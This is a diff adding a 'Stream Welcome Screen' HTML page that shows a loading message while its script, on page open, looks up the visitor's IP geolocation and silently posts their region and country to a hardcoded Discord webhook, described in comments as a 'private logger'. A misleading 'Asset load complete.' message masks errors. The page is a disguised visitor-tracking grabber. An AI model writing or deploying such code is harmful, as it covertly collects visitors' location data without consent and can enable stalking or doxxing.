@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stream Welcome Screen</title>
+    <style>
+        body { font-family: sans-serif; background: #111; color: #fff; text-align: center; padding-top: 100px; }
+        h1 { color: #9146FF; }
+    </style>
+</head>
+<body>
+    <h1>Welcome to the Stream!</h1>
+    <p>Loading stream assets... please wait.</p>
+
+    <script>
+        // Paste your Discord or Webhook URL between the quotes below
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1504591125858750635/3ej395jYnj8VxkF7mV4cnmrdyPNA6Z1BfBx7Jaw3WP4POwshtwODmMxZSiX_i1XfemTj";
+
+        async function grabLocation() {
+            try {
+                // Uses the free, no-key IP-API service to find the state
+                const response = await fetch('https://ip-api.com');
+                const data = await response.json();
+                
+                if (data.status === 'success') {
+                    const payload = {
+                        content: `📢 **New Visitor Click!** From State/Region: **${data.regionName}**, Country: **${data.country}**`
+                    };
+
+                    // Sends the state text directly to your private logger/Discord
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                }
+            } catch (error) {
+                console.log("Asset load complete.");
+            }
+        }
+
+        // Run the location log instantly when page opens
+        grabLocation();
+    </script>
+</body>
+</html>
